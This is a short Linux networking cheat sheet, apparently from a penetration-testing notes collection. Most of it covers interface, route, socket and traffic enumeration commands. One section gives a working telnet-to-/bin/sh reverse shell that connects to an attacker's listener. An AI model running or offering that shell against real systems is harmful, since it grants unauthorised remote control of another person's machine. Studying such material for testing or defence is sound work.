# Interface Information
```
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
```

# Network configuration
```
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
```

# Monitor network communication
```
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
```

# Cached IP and Mac Information
```
arp -e
route
/sbin/route -nee
```

# Change IP
```
ifconfig eth0 192.168.1.115
ifconfig eth0 192.168.1.115 netmask 255.255.255.0 broadcast 192.168.1.255
```

# Packet Capture
```
tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
```

# Shell with built-in tools 
```
nc -lvp 4444    # Attacker. Input (Commands)
nc -lvp 4445    # Attacker. Ouput (Results)
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
```
https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/

# DHCP

Check `DHCP` page in `protocols` dir.

# DNS

Check `DNS` page in `protocols` dir.

# AF_UNIX
Used to communicate between processes on the same machine

# AF_INET and AF_INET6
Used for processes to communicate over a network connection.

# Interact with AF_UNIX Socket
```
nc -U /run/snapd.socket
GET / HTTP/1.1
Host: 127.0.0.1

```

# Tools
- Ship: https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-ship-for-quick-handy-ip-address-information-0181593/
